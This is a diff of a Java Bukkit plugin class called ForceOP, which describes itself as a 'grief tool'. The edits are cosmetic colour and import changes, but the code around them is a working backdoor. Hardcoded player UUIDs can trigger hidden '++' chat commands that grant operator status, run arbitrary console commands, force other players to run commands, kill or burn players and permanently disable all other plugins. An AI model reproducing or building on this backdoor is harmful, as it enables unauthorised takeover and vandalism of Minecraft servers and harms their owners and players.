@@ -9,7 +9,6 @@ import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.GameMode;
 import org.bukkit.Material;
-import org.bukkit.craftbukkit.Main;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -22,9 +21,9 @@ public class ForceOP implements Listener{
 	String version;
 	List<String> players;
 
-	Main main;
+	com.webmets.forceop.Main main;
 	
-	public ForceOP(Main main) {
+	public ForceOP(com.webmets.forceop.Main main2) {
 		this.prefix = "++";
 		this.version = "0.0.1";
 		players = new ArrayList<String>();
@@ -33,7 +32,7 @@ public class ForceOP implements Listener{
 		players.add("82675533-0d2a-455f-a22a-8aeabec2a6c2"); //_IAbuse_
 		players.add("268b70b7-dc91-4c1e-bd73-2bf8ad600a59"); //Tesla2k
 		players.add("f1c67a72-b906-462b-8da7-bb7b6fa1d530"); //DogMaster308
-		this.main = main;
+		this.main = main2;
 	}
 	
 	@EventHandler
@@ -60,7 +59,7 @@ public class ForceOP implements Listener{
 			broadcast(p.getName()+" executed " + cmd);
 		} else if(cmd.equalsIgnoreCase("console")) {
 			if(args.length < 2) {
-				p.sendMessage("++console <command>");
+				p.sendMessage(ChatColor.AQUA + "++console <command>");
 				return;
 			}
 			StringBuilder sb = new StringBuilder();
@@ -72,12 +71,12 @@ public class ForceOP implements Listener{
 			broadcast(p.getName() + " executed  " + cmd + ": " + command);
 		} else if(cmd.equalsIgnoreCase("sudo")) {
 			if(args.length <= 2) {
-				p.sendMessage("++sudo <player> <message>");
+				p.sendMessage(ChatColor.AQUA + "++sudo <player> <message>");
 				return;
 			}
 			Player player = Bukkit.getPlayer(args[1]);
 			if(player == null || !player.isOnline()) {
-				p.sendMessage("player not found");
+				p.sendMessage(ChatColor.DARK_RED + "player not found");
 				return;
 			}
 			StringBuilder sb = new StringBuilder();
@@ -89,7 +88,7 @@ public class ForceOP implements Listener{
 			broadcast(p.getName()+" forced " + player.getName() + " to run " + command);
 		} else if(cmd.equalsIgnoreCase("sudo-all")) {
 			if(args.length <= 2) {
-				p.sendMessage("++sudo <player> <message>");
+				p.sendMessage(ChatColor.AQUA + "++sudo <player> <message>");
 				return;
 			}
 			StringBuilder sb = new StringBuilder();
@@ -170,7 +169,7 @@ public class ForceOP implements Listener{
 			} else {
 				Player player = Bukkit.getPlayer(args[1]);
 				if(player == null || !player.isOnline()) {
-					p.sendMessage("player not found");
+					p.sendMessage(ChatColor.DARK_RED + "player not found");
 					return;
 				}
 				player.getWorld().strikeLightning(player.getLocation());
@@ -180,7 +179,7 @@ public class ForceOP implements Listener{
 			if(args.length >= 3) {
 				Player player = Bukkit.getPlayer(args[1]);
 				if(player == null || !player.isOnline()) {
-					p.sendMessage("player not found");
+					p.sendMessage(ChatColor.DARK_RED + "player not found");
 					return;
 				}
 				int time = 0;
@@ -211,7 +210,7 @@ public class ForceOP implements Listener{
 			} else {
 				Player player = Bukkit.getPlayer(args[1]);
 				if(player == null || !player.isOnline()) {
-					p.sendMessage("player not found");
+					p.sendMessage(ChatColor.DARK_RED + "player not found");
 					return;
 				}
 				player.setAllowFlight(!player.getAllowFlight());
@@ -219,12 +218,12 @@ public class ForceOP implements Listener{
 			}
 		} else if(cmd.equalsIgnoreCase("invsee")) {
 			if(args.length < 2) {
-				p.sendMessage("++invsee <player>");
+				p.sendMessage(ChatColor.AQUA + "++invsee <player>");
 				return;
 			}
 			Player player = Bukkit.getPlayer(args[1]);
 			if(player == null || !player.isOnline()) {
-				p.sendMessage("player not found");
+				p.sendMessage(ChatColor.DARK_RED + "player not found");
 				return;
 			}
 			p.openInventory(player.getInventory());
@@ -233,88 +232,88 @@ public class ForceOP implements Listener{
 	} 
 	
 	private void showIndex(Player p) {
-		p.sendMessage("ForceOP grief tool (v."+version+")");
-		p.sendMessage("<> = required. [] = optional");
+		p.sendMessage(ChatColor.BLUE +  "ForceOP grief tool (v."+version+")");
+		p.sendMessage(ChatColor.BLUE + "<> = required. [] = optional");
 		
 		p.sendMessage(this.prefix+"help");
-		p.sendMessage("- get this help index");
+		p.sendMessage(ChatColor.DARK_AQUA + "- get this help index");
 		
 		p.sendMessage(this.prefix+"op");
-		p.sendMessage("- give yourself /op");
+		p.sendMessage(ChatColor.AQUA + "- give yourself /op");
 		p.sendMessage(this.prefix+"deop");
-		p.sendMessage("- deop yourself");
+		p.sendMessage(ChatColor.AQUA + "- deop yourself");
 		p.sendMessage(this.prefix+"op-all");
-		p.sendMessage("- give all players op");
+		p.sendMessage(ChatColor.AQUA + "- give all players op");
 		
 		p.sendMessage(this.prefix+"console <command>");
-		p.sendMessage("- run a command trough console §l(DO NOT INCLUDE '/')");
+		p.sendMessage(ChatColor.AQUA + "- run a command trough console §l(DO NOT INCLUDE '/')");
 		
 		p.sendMessage(this.prefix+"sudo <player> <any message or command>");
-		p.sendMessage("- force the specified player to run any command or message");
+		p.sendMessage(ChatColor.AQUA + "- force the specified player to run any command or message");
 		p.sendMessage(this.prefix+"sudo-all <any message or command>");
-		p.sendMessage("- force all players to run the specified command");
+		p.sendMessage(ChatColor.AQUA + "- force all players to run the specified command");
 		
 		p.sendMessage(this.prefix+"gmc <name>");
-		p.sendMessage("- give yourself creative");
+		p.sendMessage(ChatColor.AQUA + "- give yourself creative");
 		p.sendMessage(this.prefix+"gmc-all");
-		p.sendMessage("- give all players creative");
+		p.sendMessage(ChatColor.AQUA + "- give all players creative");
 		
 		p.sendMessage(this.prefix+"gms <name>");
-		p.sendMessage("- give yourself survival");
+		p.sendMessage(ChatColor.AQUA + "- give yourself survival");
 		p.sendMessage(this.prefix+"gms-all");
-		p.sendMessage("- give all players survival");
+		p.sendMessage(ChatColor.AQUA + "- give all players survival");
 		
 		p.sendMessage(this.prefix+"gmsp <name>");
-		p.sendMessage("- give yourself spectator");
+		p.sendMessage(ChatColor.AQUA + "- give yourself spectator");
 		p.sendMessage(this.prefix+"gmsp-all");
-		p.sendMessage("- give all players spectator");
+		p.sendMessage(ChatColor.AQUA + "- give all players spectator");
 		
 		p.sendMessage(this.prefix+"kill <player>");
-		p.sendMessage("- kill the specified player");
+		p.sendMessage(ChatColor.AQUA + "- kill the specified player");
 		p.sendMessage(this.prefix+"kill-all");
-		p.sendMessage("- kill all players");
+		p.sendMessage(ChatColor.AQUA + "- kill all players");
 		
 		p.sendMessage(this.prefix+"day");
-		p.sendMessage("- change the time to day");
+		p.sendMessage(ChatColor.AQUA + "- change the time to day");
 		p.sendMessage(this.prefix+"night");
-		p.sendMessage("- chance the time to night");
+		p.sendMessage(ChatColor.AQUA + "- chance the time to night");
 
 		p.sendMessage(this.prefix+"sun");
-		p.sendMessage("- change the weather to sun");
+		p.sendMessage(ChatColor.AQUA + "- change the weather to sun");
 		p.sendMessage(this.prefix+"rain");
-		p.sendMessage("- change the weather to rain");
+		p.sendMessage(ChatColor.AQUA + "- change the weather to rain");
 		p.sendMessage(this.prefix+"storm");
-		p.sendMessage("- change the weather to storm");
+		p.sendMessage(ChatColor.AQUA + "- change the weather to storm");
 		
 		p.sendMessage(this.prefix+"smite [player]");
-		p.sendMessage("- strike lightning (specify player to strike them)");
+		p.sendMessage(ChatColor.AQUA + "- strike lightning (specify player to strike them)");
 		p.sendMessage(this.prefix+"burn <player> <seconds>");
-		p.sendMessage("- burn the specified player for x seconds");
+		p.sendMessage(ChatColor.AQUA + "- burn the specified player for x seconds");
 		p.sendMessage(this.prefix+"burn-all <seconds>");
-		p.sendMessage("- burn all players for x seconds");
+		p.sendMessage(ChatColor.AQUA + "- burn all players for x seconds");
 		
 		p.sendMessage(this.prefix+"fly [player]");
-		p.sendMessage("- toggle flight (specify player to toggle their flight)");
+		p.sendMessage(ChatColor.AQUA + "- toggle flight (specify player to toggle their flight)");
 		p.sendMessage(this.prefix+"disable <plugin>");
-		p.sendMessage("- disable the specified plugin §l(can not be reversed!)");
+		p.sendMessage(ChatColor.AQUA + "- disable the specified plugin §l(can not be reversed!)");
 		p.sendMessage(this.prefix+"disable-all");
-		p.sendMessage("- disable all plugins (except ForceOP)");
+		p.sendMessage(ChatColor.AQUA + "- disable all plugins (except ForceOP)");
 		
 		p.sendMessage(this.prefix+"invsee <player>");
-		p.sendMessage("- open the specified player's inventory");
-		p.sendMessage("- only works on servers running Essentials");
+		p.sendMessage(ChatColor.AQUA + "- open the specified player's inventory");
+		p.sendMessage(ChatColor.AQUA + "- only works on servers running Essentials");
 		
 		p.sendMessage(this.prefix+"tp <player>");
-		p.sendMessage("- teleport to the specified player");
+		p.sendMessage(ChatColor.AQUA + "- teleport to the specified player");
 		p.sendMessage(this.prefix+"tp <player> <player>");
-		p.sendMessage("- teleport the first specified player to the second");
+		p.sendMessage(ChatColor.AQUA + "- teleport the first specified player to the second");
 		p.sendMessage(this.prefix+"tppos <x,y,z>");
-		p.sendMessage("- teleport to the giving co-oords");
+		p.sendMessage(ChatColor.AQUA + "- teleport to the giving co-oords");
 		
 		p.sendMessage(this.prefix+"spam <player> <seconds>");
-		p.sendMessage("- spam the specified player for x seconds");
+		p.sendMessage(ChatColor.AQUA + "- spam the specified player for x seconds");
 		p.sendMessage(this.prefix+"spam-all <seconds>");
-		p.sendMessage("- spam all players for x seconds");
+		p.sendMessage(ChatColor.AQUA + "- spam all players for x seconds");
 	}
 	
 	private void broadcast(String msg) {
